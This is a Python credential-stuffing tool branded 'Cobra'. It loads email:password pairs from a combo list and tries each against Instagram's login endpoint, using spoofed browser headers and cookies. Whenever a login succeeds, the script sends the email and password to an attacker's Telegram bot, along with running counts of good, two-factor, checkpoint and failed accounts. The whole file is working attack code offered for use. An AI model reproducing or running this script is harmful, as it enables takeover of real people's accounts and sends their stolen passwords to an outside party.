import random
import requests

hits = 0
bad = 0
free = 0
error = 0

r = requests.session()

print("""
Instagram COMBO LIST

@QQQAQQ ----- @Cobra_Hunter

TELE : @QQQAQQ : @Cobra_Hunter                                                  
============================================         
""")
token =	input("ENTER YOUR TOKEN COBRA :")
ID =	input("ENTER YOUR ID COBRA : ")
start_msg = r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=LODING..... ⏸️").json()#Tofe_x
id_msg	=(start_msg['result']["message_id"])
do = 0
bin =	0
err	=	0
bd =	0
InI =	0
def login():
	global headX , gxo , Tofe_x , slp , bin , do , err , bd , id_msg , InI
	urX = "https://www.instagram.com/accounts/login/ajax/"
	headX = {
		'accept': '*/*',#Tofe x
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en-US,en;q=0.9',
		'content-length': '272',
		'content-type': 'application/x-www-form-urlencoded',
		'cookie': 'ig_did=F839D900-5ECC-4392-BCAD-5CBD51FB9228; mid=YChlyQALAAHp2POOp2lK_-ciAGlM; ig_nrcb=1; csrftoken=W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r; ds_user_id=45872034997; shbid=6144; shbts=1614374582.8963153',#Tofe_x
		'origin': 'https://www.instagram.com',
		'referer': 'https://www.instagram.com/accounts/login/',#Tofe_x
		'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',#Tofe_x
		'x-csrftoken': 'W4fsZmCjUjFms6XmKl1OAjg8v81jZt3r',
		'x-ig-app-id': '936619743392459',
		'x-ig-www-claim': '0',
		'x-instagram-ajax': '790551e77c76',
		'x-requested-with': 'XMLHttpRequest'}#Tofex
	
	Tofe_x = {
		"username": Email,
		"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
		"queryParams": "{}",
		"optIntoOneTap": "false"}#Tofex

	gxo = r.post(urX,headers=headX,data=Tofe_x)
	if ("userId") in gxo.text:
		InI +=1
		do +=1
		r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⚚ 𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝐼𝑁 𝐶𝑂𝒃𝑅𝐴 𝑇𝑂𝑂𝐿𝑆🧡📸 ؛  ⚚\n---------------------------------------------\n𝖾𝗆𝖺𝗂𝗅 𝗈𝗋 𝗎𝗌𝖾𝗋 𝖼𝗈𝗎𝗇𝗍 📶 : {InI}\n\n𝖽𝗈𝗇𝖾 ✅ : {do}\n\n𝖾𝗋𝗋𝗈𝗋 ❌ : {err}\n\n𝖻𝖺𝖽 📛 : {bd}\n\n𝖻𝗂𝗇𝖺𝗋𝗒 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 🔰 : {bin}\n---------------------------------------------\n𝗈𝗎𝗋 𝖼𝗁𝖺𝗇𝗇𝖾𝗅 ♻️ : @Cobra_Hunter")
		r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= HI SER COBRA NEW ACC INSTA. \n email 🐍 : {Email} \n\n𝗉𝖺𝗌𝗌𝗐𝗈𝗋𝖽🐍: {password} \n-----------------------------------------\ 𝖼𝗁𝖺𝗇𝗇𝖾𝗅 🐍 : @Cobra_Hunter")
	elif ("two_factor") in gxo.text:
		InI +=1
		bin +=1
		r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⚚ 𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝐼𝑁 𝐶𝑂𝒃𝑅𝐴 𝑇𝑂𝑂𝐿𝑆🧡📸 ؛  ⚚\n---------------------------------------------\n𝖾𝗆𝖺𝗂𝗅 𝗈𝗋 𝗎𝗌𝖾𝗋 𝖼𝗈𝗎𝗇𝗍 📶 : {InI}\n\n𝖽𝗈𝗇𝖾 ✅ : {do}\n\n𝖾𝗋𝗋𝗈𝗋 ❌ : {err}\n\n𝖻𝖺𝖽 📛 : {bd}\n\n𝖻𝗂𝗇𝖺𝗋𝗒 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 🔰 : {bin}\n---------------------------------------------\n𝗈𝗎𝗋 𝖼𝗁𝖺𝗇𝗇𝖾𝗅 ♻️ : @Cobra_Hunter")
	elif ("checkpoint_url")  in gxo.text:
		InI +=1
		bd +=1
		r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⚚ 𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝐼𝑁 𝐶𝑂𝒃𝑅𝐴 𝑇𝑂𝑂𝐿𝑆🧡📸 ؛  ⚚\n---------------------------------------------\n𝖾𝗆𝖺𝗂𝗅 𝗈𝗋 𝗎𝗌𝖾𝗋 𝖼𝗈𝗎𝗇𝗍 📶 : {InI}\n\n𝖽𝗈𝗇𝖾 ✅ : {do}\n\n𝖾𝗋𝗋𝗈𝗋 ❌ : {err}\n\n𝖻𝖺𝖽 📛 : {bd}\n\n𝖻𝗂𝗇𝖺𝗋𝗒 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 🔰 : {bin}\n---------------------------------------------\n𝗈𝗎𝗋 𝖼𝗁𝖺𝗇𝗇𝖾𝗅 ♻️ : @Cobra_Hunter")
	else:
		err +=1
		InI +=1
		r.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=⚚ 𝑊𝐸𝐿𝐶𝑂𝑀𝐸 𝐼𝑁 𝐶𝑂𝒃𝑅𝐴 𝑇𝑂𝑂𝐿𝑆🧡📸 ؛  ⚚\n---------------------------------------------\n𝖾𝗆𝖺𝗂𝗅 𝗈𝗋 𝗎𝗌𝖾𝗋 𝖼𝗈𝗎𝗇𝗍 📶 : {InI}\n\n𝖽𝗈𝗇𝖾 ✅ : {do}\n\n𝖾𝗋𝗋𝗈𝗋 ❌ : {err}\n\n𝖻𝖺𝖽 📛 : {bd}\n\n𝖻𝗂𝗇𝖺𝗋𝗒 𝗏𝖾𝗋𝗂𝖿𝗂𝖼𝖺𝗍𝗂𝗈𝗇 🔰 : {bin}\n---------------------------------------------\n𝗈𝗎𝗋 𝖼𝗁𝖺𝗇𝗇𝖾𝗅 ♻️ : @Cobra_Hunter")

for i in open("combo.txt","r").read().splitlines():
	Acc = str(i)
	password = Acc.split(":")[1]
	Email = Acc.split(":")[0]
	login()
